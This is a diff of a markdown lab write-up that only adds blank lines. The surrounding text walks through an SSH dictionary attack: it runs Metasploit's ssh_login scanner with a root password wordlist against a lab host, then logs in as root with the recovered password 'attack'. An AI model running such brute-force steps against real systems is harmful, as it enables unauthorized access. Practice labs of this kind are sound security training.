@@ -84,19 +84,34 @@ Now we want to find the password of user "root" using ssh_login metasploit modul
 `msfconsole`
 
   msf5: `use auxiliary/scanner/ssh/ssh_login`
+  
   msf5: `options`
+  
   msf5: `set rhosts 192.35.81.3`
+  
   msf5: `set userpass_file /usr/share/wordlists/metasploit/root_userpass.txt`
+  
   msf5: `set STOP_ON_SUCCESS true`
+  
   msf5: `set verbose true`
+
   msf5: `options`
+  
   msf5: `run`
+  
   msf5: `exit`
+  
 **password: attack**
+
 We wanna establish a ssh connection with the password we enumerated:
+
 `ssh root@192.35.81.3`: insert attack
+
 after login, we recieve the message of the day:
+
 _SSH recon dictionary attack lab_
+
+
 Questions
 
 1. Find the password of user “student” using hydra.
